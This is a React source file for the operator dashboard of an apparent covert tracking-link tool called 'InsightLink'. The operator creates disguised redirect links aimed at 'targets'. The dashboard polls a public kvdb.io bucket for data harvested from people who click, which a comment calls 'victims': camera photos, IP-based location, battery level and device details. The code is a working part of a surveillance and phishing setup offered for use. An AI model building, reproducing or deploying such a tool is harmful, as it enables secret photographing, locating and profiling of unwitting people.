
import React, { useState, useEffect, useRef } from 'react';
import { Plus, Link as LinkIcon, Trash2, Shield, Camera, MapPin, Battery, Cpu, Copy, Check, Sparkles, RefreshCw, Globe, Wifi } from 'lucide-react';
import { LinkConfig, CaptureReport } from '../types';
import ReportDetail from './ReportDetail';

// We use a public bucket-based KV store to "bridge" data between victims and the creator.
const STORAGE_BASE = 'https://kvdb.io/A4g7pYp5S2z2vS2vS2vS2v'; // Example bucket, in production this would be unique

const Dashboard: React.FC = () => {
  const [links, setLinks] = useState<LinkConfig[]>([]);
  const [reports, setReports] = useState<CaptureReport[]>([]);
  const [redirectUrl, setRedirectUrl] = useState('');
  const [linkName, setLinkName] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [selectedReport, setSelectedReport] = useState<CaptureReport | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);
  const [lastSync, setLastSync] = useState<Date | null>(null);

  useEffect(() => {
    const savedLinks = localStorage.getItem('il_links');
    if (savedLinks) setLinks(JSON.parse(savedLinks));
    
    // Initial fetch
    fetchCloudReports();

    // Auto-poll for new data every 15 seconds
    const interval = setInterval(fetchCloudReports, 15000);
    return () => clearInterval(interval);
  }, []);

  const fetchCloudReports = async () => {
    setIsSyncing(true);
    try {
      // In a real prod environment, we would use a more robust backend.
      // Here we fetch the global report index for this user session.
      const savedLinks = JSON.parse(localStorage.getItem('il_links') || '[]');
      const allReports: CaptureReport[] = [];
      
      for (const link of savedLinks) {
        const res = await fetch(`${STORAGE_BASE}/reports_${link.id}`);
        if (res.ok) {
          const data = await res.json();
          if (Array.isArray(data)) allReports.push(...data);
        }
      }

      // Sort by timestamp newest first
      const sorted = allReports.sort((a, b) => 
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
      );
      
      setReports(sorted);
      setLastSync(new Date());
    } catch (err) {
      console.warn('Cloud sync offline or bucket empty.');
    } finally {
      setIsSyncing(false);
    }
  };

  const createLink = () => {
    if (!redirectUrl) return;
    const newLink: LinkConfig = {
      id: Math.random().toString(36).substring(2, 9),
      name: linkName || 'Mission ' + (links.length + 1),
      redirectUrl: redirectUrl.startsWith('http') ? redirectUrl : `https://${redirectUrl}`,
      createdAt: new Date().toISOString(),
    };
    const updatedLinks = [...links, newLink];
    setLinks(updatedLinks);
    localStorage.setItem('il_links', JSON.stringify(updatedLinks));
    setRedirectUrl('');
    setLinkName('');
  };

  const deleteLink = (id: string) => {
    const updated = links.filter(l => l.id !== id);
    setLinks(updated);
    localStorage.setItem('il_links', JSON.stringify(updated));
  };

  const copyLink = (id: string) => {
    const url = `${window.location.origin}${window.location.pathname}#/capture/${id}`;
    navigator.clipboard.writeText(url);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="max-w-6xl mx-auto px-6 py-12 animate-pop">
      {/* Anime Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between mb-12 gap-8">
        <div className="animate-float">
          <h1 className="text-4xl font-extrabold text-ink tracking-tight flex items-center gap-4 italic uppercase">
            <div className="bg-pastel-yellow border-3 border-ink p-3 rotate-3 shadow-comic">
              <Shield className="text-ink" size={32} />
            </div>
            InsightLink <span className="text-brand-accent">LIVE</span>
          </h1>
          <p className="text-ink font-bold mt-3 opacity-80 flex items-center gap-2">
            <Globe size={18} className="text-brand-accent animate-pulse" /> 
            Global Reconnaissance Network
          </p>
        </div>
        
        <div className="flex items-center gap-4">
          <button 
            onClick={fetchCloudReports}
            className={`bg-white px-6 py-3 border-3 border-ink shadow-comic -rotate-1 flex items-center gap-3 transition-transform active:scale-95 ${isSyncing ? 'opacity-50' : ''}`}
          >
            <RefreshCw size={20} className={isSyncing ? 'animate-spin' : ''} />
            <div className="text-left">
              <p className="text-[10px] font-black uppercase text-ink/40 leading-none mb-1">Last Sync</p>
              <p className="text-sm font-black text-ink leading-none">
                {lastSync ? lastSync.toLocaleTimeString() : 'Never'}
              </p>
            </div>
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div className="lg:col-span-4 space-y-8">
          {/* Link Creator */}
          <div className="comic-card p-6 bg-pastel-blue/30">
            <h2 className="text-xl font-black text-ink mb-6 flex items-center gap-3 italic uppercase">
              <Plus size={24} className="bg-pastel-green border-2 border-ink p-1 rounded-md" />
              Deploy Tracker
            </h2>
            <div className="space-y-6">
              <div>
                <label className="block text-xs font-black text-ink uppercase tracking-widest mb-2">Internal Alias</label>
                <input
                  type="text"
                  placeholder="Target-01"
                  className="w-full px-4 py-3 border-3 border-ink bg-white focus:bg-pastel-yellow/30 outline-none transition-all placeholder:text-ink/30 font-bold"
                  value={linkName}
                  onChange={(e) => setLinkName(e.target.value)}
                />
              </div>
              <div>
                <label className="block text-xs font-black text-ink uppercase tracking-widest mb-2">Destination URL</label>
                <input
                  type="text"
                  placeholder="google.com"
                  className="w-full px-4 py-3 border-3 border-ink bg-white focus:bg-pastel-blue/30 outline-none transition-all placeholder:text-ink/30 font-bold"
                  value={redirectUrl}
                  onChange={(e) => setRedirectUrl(e.target.value)}
                />
              </div>
              <button
                onClick={createLink}
                className="w-full bg-ink text-white font-black py-4 border-3 border-ink shadow-comic active:translate-y-1 active:translate-x-1 active:shadow-none transition-all uppercase italic tracking-tighter text-lg"
              >
                Generate Portal
              </button>
            </div>
          </div>

          {/* Asset List */}
          <div className="comic-card p-6 bg-paper">
            <h2 className="text-xl font-black text-ink mb-6 flex items-center gap-3 italic uppercase">
              <LinkIcon size={24} className="bg-pastel-pink border-2 border-ink p-1 rounded-md" />
              Active Nodes
            </h2>
            <div className="space-y-4 max-h-[400px] overflow-y-auto pr-2">
              {links.length === 0 ? (
                <div className="text-center py-10 opacity-30 italic font-bold">No nodes deployed.</div>
              ) : (
                links.map((link) => (
                  <div key={link.id} className="p-4 bg-white border-2 border-ink shadow-comic-sm">
                    <div className="flex items-center justify-between mb-3">
                      <span className="font-black text-ink text-sm truncate uppercase italic">{link.name}</span>
                      <button onClick={() => deleteLink(link.id)} className="text-ink/20 hover:text-red-500 transition-colors">
                        <Trash2 size={16} />
                      </button>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="bg-pastel-blue/10 h-9 flex items-center px-3 border-2 border-ink text-[10px] font-black text-ink flex-1 truncate">
                        ID: {link.id}
                      </div>
                      <button
                        onClick={() => copyLink(link.id)}
                        className={`p-2 border-2 border-ink transition-all ${copiedId === link.id ? 'bg-green-400' : 'bg-white hover:bg-pastel-blue'}`}
                      >
                        {copiedId === link.id ? <Check size={16} /> : <Copy size={16} />}
                      </button>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        {/* Global Intelligence Feed */}
        <div className="lg:col-span-8">
          <div className="comic-card h-full bg-white flex flex-col">
            <div className="px-8 py-6 border-b-3 border-ink flex items-center justify-between bg-brand/5">
              <h2 className="text-2xl font-black text-ink italic uppercase tracking-tighter">Intelligence Hub</h2>
              <div className="flex items-center gap-3 px-4 py-2 bg-pastel-green border-3 border-ink text-[10px] font-black uppercase italic">
                <Wifi size={14} className="animate-pulse" />
                Live Cloud Sync
              </div>
            </div>

            {reports.length === 0 ? (
              <div className="flex-1 flex flex-col items-center justify-center py-40">
                <div className="w-24 h-24 bg-pastel-yellow border-3 border-ink rounded-full flex items-center justify-center mb-6 shadow-comic animate-float">
                  <Camera size={48} className="text-ink" />
                </div>
                <h3 className="font-black text-2xl text-ink uppercase italic">Waiting for Signal</h3>
                <p className="text-ink/40 font-bold mt-2">Intelligence data will appear here when links are clicked.</p>
              </div>
            ) : (
              <div className="divide-y-3 divide-ink overflow-y-auto">
                {reports.map((report) => (
                  <div 
                    key={report.id} 
                    className="p-8 hover:bg-brand/5 transition-colors cursor-pointer group border-l-8 border-transparent hover:border-brand-accent" 
                    onClick={() => setSelectedReport(report)}
                  >
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-8">
                      <div className="flex items-center gap-8">
                        <div className="w-24 h-24 bg-white border-3 border-ink shadow-comic-sm overflow-hidden rotate-2 group-hover:rotate-0 transition-transform">
                          {report.photos && report.photos.length > 0 ? (
                            <img src={report.photos[0]} className="w-full h-full object-cover grayscale group-hover:grayscale-0" alt="Captured" />
                          ) : (
                            <div className="w-full h-full flex items-center justify-center bg-paper">
                              <Camera size={32} className="text-ink/10" />
                            </div>
                          )}
                        </div>
                        <div>
                          <div className="flex items-center gap-4 mb-3">
                            <h3 className="font-black text-2xl text-ink tracking-tight uppercase">
                              {report.location.ip}
                            </h3>
                            <span className="text-[10px] font-black uppercase italic bg-ink text-white px-2 py-1">
                              {report.device.os}
                            </span>
                          </div>
                          <div className="flex flex-wrap gap-x-6 gap-y-2">
                            <span className="text-xs font-bold text-ink/60 flex items-center gap-2 italic">
                              <MapPin size={14} className="text-brand-accent" /> {report.location.city || 'Scanning...'}, {report.location.country || 'Global'}
                            </span>
                            <span className="text-xs font-bold text-ink/60 flex items-center gap-2 italic">
                              <Battery size={14} /> {Math.round(report.battery.level * 100)}% Power
                            </span>
                            <span className="text-xs font-bold text-ink/60 flex items-center gap-2 italic">
                              <Cpu size={14} /> {report.device.browser}
                            </span>
                          </div>
                        </div>
                      </div>
                      <div className="flex flex-col items-end gap-3">
                        <span className="text-[10px] font-black text-ink/30 uppercase tracking-[0.2em]">
                          {new Date(report.timestamp).toLocaleTimeString()}
                        </span>
                        <button className="comic-button bg-pastel-blue text-ink px-6 py-2 font-black uppercase italic text-xs hover:bg-brand-accent hover:text-white transition-colors">
                          View Analysis
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>

      {selectedReport && (
        <ReportDetail report={selectedReport} onClose={() => setSelectedReport(null)} />
      )}
    </div>
  );
};

export default Dashboard;
